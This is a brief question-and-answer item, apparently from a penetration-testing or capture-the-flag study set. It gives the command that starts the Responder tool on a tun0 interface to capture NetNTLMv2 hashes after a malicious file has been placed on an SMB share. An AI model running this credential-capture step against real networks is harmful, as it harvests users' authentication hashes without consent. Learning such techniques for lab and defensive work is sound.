@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you initiate the Responder tool to capture NTLM hashes?
+
+CONTEXT:
+You have uploaded the malicious exploit to the SMB share.
+
+METHOD / ANSWER:
+Command: `sudo uv run /opt/Responder/Responder.py -I tun0`
+Explanation: This starts the Responder tool to capture NetNTLMv2 hashes as users trigger authentication attempts.
